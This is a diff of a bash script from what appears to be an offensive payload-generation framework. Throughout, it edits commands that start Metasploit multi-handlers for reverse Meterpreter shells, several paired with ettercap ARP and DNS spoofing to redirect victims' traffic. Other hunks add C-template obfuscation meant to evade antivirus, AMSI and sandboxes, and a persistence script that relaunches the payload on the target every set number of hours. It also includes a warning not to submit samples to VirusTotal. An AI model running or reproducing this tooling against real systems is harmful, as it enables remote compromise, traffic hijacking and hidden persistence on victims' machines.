-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -678,15 +688,15 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
 
         fi
    fi
 
 
-# CLEANING EVERYTHING UP
-echo "[☠] Cleanning temp generated files..."
+## CLEANING EVERYTHING UP
+echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset};
 mv $IPATH/templates/exec[bak].c $InJEc
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
@@ -696,16 +706,16 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
+sh_menu
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
-  sh_unix_menu
+  sh_menu
   clear
 fi
 }
-
 
 
 
@@ -986,9 +996,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -1007,9 +1017,9 @@ fi
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -1026,9 +1036,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -1047,9 +1057,9 @@ fi
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
 
@@ -1267,7 +1277,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -1282,7 +1292,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
         else
@@ -1295,7 +1305,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -1310,7 +1320,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -1778,15 +1788,40 @@ sleep 2
 # EDITING/BACKUP FILES NEEDED
 echo "[☠] editing/backup files..."
 cp $InJEc3 $IPATH/templates/exec_bin[bak].c
+cp $IPATH/templates/exec_bin2.c $IPATH/templates/exec_bin2[bak].c
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
 
-   # edit exec.c using leafpad or gedit editor
-   if [ "$DiStR0" = "Kali" ]; then
-      leafpad $InJEc3 > /dev/null 2>&1
-   else
-      gedit $InJEc3 > /dev/null 2>&1
-   fi
+
+   # C OBFUSCATION MODULE 
+   OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
+  cd $IPATH/templates
+  # edit exec.c using leafpad or gedit editor
+  if [ "$DiStR0" = "Kali" ]; then
+     leafpad $InJEc3 > /dev/null 2>&1
+  else
+     gedit $InJEc3 > /dev/null 2>&1
+  fi
+
+
+else
+echo "[✔] String obfuscation technics sellected .."
+### TODO: check if payload executes well in target
+# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
+# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
+#
+cd $IPATH/templates
+
+  # edit exec.c using leafpad or gedit editor
+  if [ "$DiStR0" = "Kali" ]; then
+     leafpad exec_bin2.c > /dev/null 2>&1
+  else
+     gedit exec_bin2.c > /dev/null 2>&1
+  fi
+  mv exec_bin2.c exec_bin.c > /dev/null 2>&1
+fi
+
 
 
 cd $IPATH/templates
@@ -1848,7 +1883,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.exe|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -1947,9 +1982,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
 
             cd $IPATH/output
@@ -1968,9 +2003,9 @@ fi
           else
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -1987,9 +2022,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -2008,9 +2043,9 @@ fi
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -2020,6 +2055,7 @@ sleep 2
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
+mv $IPATH/templates/exec_bin2[bak].c $IPATH/templates/exec_bin2.c > /dev/null 2>&1
 mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
 mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
@@ -2203,7 +2239,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.exe|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -2301,9 +2337,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -2322,9 +2358,9 @@ fi
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -2341,9 +2377,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -2362,9 +2398,9 @@ fi
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
